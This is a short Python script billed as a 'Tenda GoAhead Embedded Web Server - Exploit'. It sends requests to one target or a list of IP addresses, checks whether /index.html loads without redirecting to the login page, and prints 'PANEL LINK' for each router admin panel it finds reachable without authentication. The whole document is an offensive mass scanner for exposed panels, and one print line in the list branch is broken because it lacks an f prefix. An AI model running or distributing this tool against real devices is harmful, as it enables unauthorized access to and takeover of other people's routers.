import requests
import argparse
from colorama import Fore, init

init(autoreset=True)

def test_ip(ip):
    try:
        response = requests.get(ip + '/index.html', timeout=5)
        if response.status_code == 200 and '/login.html' not in response.url:
            return True
        else:
            return False
    except requests.RequestException as e:
        print(f"Failed to connect to {ip}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Test IP addresses for HTTP 200 response.")
    parser.add_argument('-u', '--url', help='Test a single IP address')
    parser.add_argument('-l', '--list', help='Test a list of IP addresses in a file')

    args = parser.parse_args()

    if args.url:
        result = test_ip(args.url)
        if result:
            print(Fore.GREEN + f"200 OK" + Fore.WHITE)
            print("PANEL LINK: " + Fore.MAGENTA + f"{args.url}/index.html" + Fore.WHITE)
        else:
            print(Fore.RED + f"Connection timed out or target not vulnerable." + Fore.WHITE)

    elif args.list:
        with open(args.list, 'r') as file:
            ip_list = file.read().splitlines()

        for ip in ip_list:
            result = test_ip(ip)
            if result:
                print(f"TARGET-IP: {ip}/index.html, 200 OK")
                print(f"PANEL LINK: " + Fore.MAGENTA + "{ip}/index.html" + Fore.WHITE)
            else:
                print(Fore.RED + "Connection timed out or target is not vulnerable.")

    else:
        print("Tenda GoAhead Embedded Web Server - Exploit")
        print("Made by @makaki22")
        print("")
        print("Usage : python vuln.py [-u / --url] [-l / --list]")
        print("Example : python vuln.py -u http://127.0.0.1:8080")

if __name__ == "__main__":
    main()
